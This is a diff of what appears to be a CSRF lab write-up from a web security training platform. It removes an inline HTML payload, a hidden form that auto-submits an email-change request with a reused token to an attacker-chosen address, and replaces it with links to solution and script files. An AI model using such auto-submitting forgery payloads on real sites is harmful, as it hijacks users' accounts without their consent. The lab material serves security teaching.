@@ -24,25 +24,10 @@ request. CSRF tokens for this web application are not correlated with the user's
 can be reused across multiple sessions. This means that an attacker can obtain a valid CSRF token
 and use it to perform actions on behalf of the user.
 
-Below is the Python script to retrieve a CSRF token:
+
+<a href="4.txt">Solution</a>
 
 <a href="4.py">Script</a>
-
-Below is the CSRF HTML payload we use to solve this lab:
-
-
-<html>
-  <body>
-    <form action="https://4.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="pwned&#64;evil&#45;user&#46;net" />
-      <input type="hidden" name="csrf" value="<CSRF TOKEN HERE>" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
 
 
 
